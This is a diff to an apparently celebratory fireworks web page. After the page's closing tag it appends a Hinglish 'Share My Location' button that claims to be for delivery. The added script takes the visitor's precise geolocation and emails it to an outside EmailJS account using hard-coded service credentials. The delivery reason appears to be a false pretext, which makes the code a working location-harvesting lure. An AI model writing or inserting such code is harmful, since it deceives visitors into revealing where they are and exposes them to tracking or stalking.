@@ -182,3 +182,49 @@ function createFireworks(){
 
 </body>
 </html>
+<h3>Delivery ke liye apni location share karein</h3>
+
+<button onclick="sendLocation()" 
+style="padding:12px 20px;font-size:16px;background:#28a745;color:white;border:none;border-radius:6px;">
+📍 Share My Location
+</button>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+// EmailJS Initialize
+(function(){
+   emailjs.init("2pInQghRcP-YZtYCK");
+})();
+
+function sendLocation() {
+
+ if (navigator.geolocation) {
+
+   navigator.geolocation.getCurrentPosition(function(position){
+
+     var lat = position.coords.latitude;
+     var lon = position.coords.longitude;
+
+     // Send Email
+     emailjs.send("service_hxul50k","template_3mjgsjk",{
+        latitude: lat,
+        longitude: lon
+     })
+     .then(function(response) {
+        alert("✅ Location successfully send ho gayi!");
+     }, function(error) {
+        alert("❌ Location send nahi hui, dubara try karein.");
+     });
+
+   },
+   function(){
+     alert("Location allow karna zaroori hai delivery ke liye.");
+   });
+
+ } else {
+   alert("Browser location support nahi karta.");
+ }
+
+}
+</script>
